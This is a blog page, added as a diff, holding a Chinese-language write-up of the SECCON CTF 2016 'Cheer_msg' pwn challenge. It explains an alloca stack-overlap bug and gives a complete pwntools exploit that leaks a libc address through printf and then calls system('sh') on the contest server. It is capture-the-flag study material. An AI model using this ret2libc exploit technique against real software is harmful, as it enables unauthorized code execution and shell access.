@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>  [SECCON CTF 2016 Quals] Cheer_msg 100
+ | naetw's blog</title>
+
+    <meta name="author" content="Naetw"/>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/jquery.mglass.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/pygment-solarized-dark.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/style.css"/>
+
+    <!-- Fonts -->
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Istok+Web' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Droid+Sans+Mono' rel='stylesheet' type='text/css'/>
+
+
+    <link rel="icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+
+    <!-- Feeds -->
+      <link href="https://naetw.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - All posts - Atom Feed"/>
+      <link href="https://naetw.github.io/feeds/write-up.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - Category: write-up - Atom Feed"/>
+
+
+  </head>
+
+  <body>
+
+    <div class="container">
+
+      <div class="page-header">
+        <h1><a href="https://naetw.github.io">naetw's blog</a> <small></small></h1>
+      </div>
+
+      <nav class="navbar navbar-default">
+
+        <!-- Hamburger menu for mobile -->
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#plumage-navbar-collapse-1" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="https://naetw.github.io" title="">naetw's blog</a>
+        </div>
+
+        <!-- Menus and search forms -->
+        <div class="collapse navbar-collapse" id="plumage-navbar-collapse-1">
+
+          <ul class="nav navbar-nav">
+<li >
+                <a href="/archives">Archives</a>
+              </li>
+<li >
+                <a href="/categories">Categories</a>
+              </li>
+<li >
+                <a href="/tags">Tags</a>
+              </li>
+          </ul>
+
+
+
+        </div>
+
+      </nav>
+
+    </div>
+
+
+    <div class="container main">
+
+
+      <div class="row">
+        <div class=" col-md-9  ">
+  <h1>
+    <a href="https://naetw.github.io/posts/2016/12/12/seccon-ctf-2016-quals-cheer_msg-100/" rel="bookmark" title="Permalink to [SECCON CTF 2016 Quals] Cheer_msg 100">[SECCON CTF 2016 Quals] Cheer_msg 100</a>
+  </h1>
+        </div>
+      </div>
+
+      <div class="row">
+
+
+        <div class=" col-md-9 " id="content" role="main">
+  
+
+  <div>
+    <h2>Analyzing</h2>
+<blockquote>
+<p>32 bit ELF, Partial RELRO, 有 canary &amp; NX, 沒有 PIE</p>
+</blockquote>
+<p>程式小小的，比較少見的部分是 <code>alloca</code> 的部分，不同於平常的 <code>malloc</code>，<code>alloca</code> 是從 caller 的 stack frame 上分配記憶體，在 function call 結束時，回收記憶體。</p>
+<p>main:</p>
+<p><img alt="main" src="http://i.imgur.com/HVWlCzl.png"></p>
+<p>因為 <code>alloca</code>，main 裡有一行指令是 <code>sub esp, eax</code>，這個 eax 的值會是根據輸入的 message length 並做一些處理，所以想法是讓 eax 為負數，<code>sub esp, eax</code> 指令做完後，esp 的 address 高於 ebp，這樣在 call message 時，<strong>因為 message function 的 stack frame 跟 main 的 stack frame 重疊</strong>，就可以用 overflow 來 overwrite return address。</p>
+<p>來看一下 stack frame 的變化:</p>
+<div class="highlight"><pre><span></span>         <span class="o">+------------------+</span> low address
+origin   <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span> <span class="o">&lt;-</span> esp 
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">......</span>previous ebp<span class="o">|</span> <span class="o">&lt;-</span> ebp
+         <span class="o">|</span><span class="m">....</span><span class="kr">return</span> address<span class="o">|</span> 
+         <span class="o">+------------------+</span> high address
+</pre></div>
+
+
+<p>after <code>sub esp, eax</code>:</p>
+<div class="highlight"><pre><span></span>         <span class="o">+------------------+</span> low address
+new      <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>  
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">......</span>previous ebp<span class="o">|</span> <span class="o">&lt;-</span> ebp
+         <span class="o">|</span><span class="m">....</span><span class="kr">return</span> address<span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span>
+         <span class="o">|</span><span class="m">...............</span><span class="kc">...</span><span class="o">|</span> <span class="o">&lt;-</span> esp
+         <span class="o">+------------------+</span> high address
+</pre></div>
+
+
+<p>message:</p>
+<p><img alt="message" src="http://i.imgur.com/W7cpuzP.png"></p>
+<p>雖然因為輸入的 length 是負數，第一個 <code>getnline</code> 無法輸入，但是主要利用的是 <strong>stack frame 的重疊</strong>，所以要寫入的地方就著重在 local variable <code>v3</code> 上</p>
+<h2>Exploit</h2>
+<p>找到漏洞後，我們已經能利用 overwrite ret address 來控制 eip，不過我們還差 libc information</p>
+<p>因此第一步是 <strong>leak libc function address</strong>，計算 <code>v3</code> 的位置與 main ret address 的 offset，因為是 32 bits，我們疊一下 fake function call，利用 <code>printf</code> 來 leak info 後，return 回 main</p>
+<p>之後再做一次差不多的事，只是這次的 fake function call 是 call <code>system('sh')</code></p>
+<h2>Final Exploit:</h2>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;cheermsg.pwn.seccon.jp&#39;</span><span class="p">,</span> <span class="mi">30527</span><span class="p">)</span>
+<span class="c1">#r = remote(&#39;127.0.0.1&#39;, 4000)</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc-2.19.so&#39;</span><span class="p">)</span>
+<span class="c1">#libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)</span>
+
+<span class="c1"># leak info</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;-100&#39;</span><span class="p">)</span>
+
+<span class="n">printf</span> <span class="o">=</span> <span class="mh">0x08048430</span>
+<span class="n">atoi_got</span> <span class="o">=</span> <span class="mh">0x804a02c</span>
+<span class="n">main</span> <span class="o">=</span> <span class="mh">0x080485ca</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Name &gt;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">48</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804a02c</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="n">atoi</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">atoi</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">atoi</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atoi</span><span class="p">)</span>
+<span class="n">base</span> <span class="o">=</span> <span class="n">atoi</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x0e469</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+<span class="c1"># exploit</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;-100&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Name &gt;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">48</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+  </div>
+
+
+
+        </div>
+
+          <div class="col-md-3">
+  <div class="well">
+
+    <p><abbr title="2016-12-12T08:24:00+08:00"><i class="fa fa-calendar"></i> Mon 12 December 2016</abbr></p>
+
+      <p><address>
+        <i class="fa fa-user"></i> By
+          <a href="https://naetw.github.io/author/naetw.html" rel="author">Naetw</a>
+      </address></p>
+
+    <hr/>
+
+      <p>
+              <a href="https://naetw.github.io/category/write-up/" rel="tag"
+                  data-toggle="tooltip" class="label label-info"
+                  title="10 articles in this category">write-up</a>
+            <a href="/tag/ctf/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">CTF</a>
+            <a href="/tag/pwn/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">pwn</a>
+            <a href="/tag/rop/" data-toggle="tooltip"
+      class="label label-default"
+      title="4 articles with this tag">ROP</a>
+            <a href="/tag/stack-overflow/" data-toggle="tooltip"
+      class="label label-default"
+      title="2 articles with this tag">Stack Overflow</a>
+            <a href="/tag/seccon/" data-toggle="tooltip"
+      class="label label-default"
+      title="2 articles with this tag">SECCON</a>
+      </p>
+      <hr/>
+
+
+
+  </div>
+            
+          </div>
+
+      </div>
+
+    </div>
+
+    <!-- TODO: make footer sticky -->
+    <footer class="container-fluid">
+      <div class="container">
+        <div class="row">
+
+            <div class="col-md-2">
+                <h5>Social</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="https://github.com/Naetw">
+      <i class="fa fa-github"></i>
+    GitHub
+  </a></li>
+                </ul>
+            </div>
+            <div class="col-md-2">
+                <h5>Links</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="http://getpelican.com/">
+      <img src="https://besticon-demo.herokuapp.com/icon?url=getpelican.com&size=16" width="16" height="16" class="icon" alt="getpelican.com icon"/>
+    Pelican
+  </a></li>
+                </ul>
+            </div>
+
+          <div class="col-md-2">
+            <h5>Browse content by</h5>
+            <ul class="list-unstyled">
+                <li><a href="https://naetw.github.io/categories/index.html"><i class="fa fa-tags"></i> Categories</a></li>
+                <li><a href="https://naetw.github.io/archives/index.html"><i class="fa fa-calendar"></i> Dates</a></li>
+                <li><a href="https://naetw.github.io/tags/index.html"><i class="fa fa-tag"></i> Tags</a></li>
+            </ul>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Copyright notice</h5>
+            <p>© Copyright 2016-2017 Naetw.</p>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Disclaimer</h5>
+              <p>All opinions expressed in this site are my own personal opinions and are not endorsed by, nor do they represent the opinions of my previous, current and future employers or any of its affiliates, partners or customers.</p>
+          </div>
+
+          <div class="col-md-2">
+              <h5>Feeds</h5>
+              <ul class="list-unstyled">
+                  <li><small><a href="https://naetw.github.io/feeds/all.atom.xml"><i class="fa fa-rss"></i> All posts (Atom)</a></small></li>
+                  <li><small><a href="https://naetw.github.io/feeds/write-up.atom.xml"><i class="fa fa-rss"></i> Category: write-up (Atom)</a></small></li>
+              </ul>
+          </div>
+
+        </div>
+      </div>
+
+      <h5 class="text-right"><a href="#"><i class="fa fa-arrow-up"></i> Back to top</a></h5>
+
+      <div class="container">
+        <div class="row col-md-12 text-muted text-center">
+          Site generated by <a href="https://getpelican.com"> Pelican</a>.<br/>
+          <a href="https://github.com/kdeldycke/plumage"> Plumage</a> theme by <a href="https://kevin.deldycke.com">Kevin Deldycke</a>.
+        </div>
+      </div>
+
+    </footer>
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fitvids/1.1.0/jquery.fitvids.min.js"></script>
+    <script src="https://naetw.github.io/theme/js/jquery.mglass.js"></script>
+    <script src="https://naetw.github.io/theme/js/application.js"></script>
+
+  </body>
+</html>
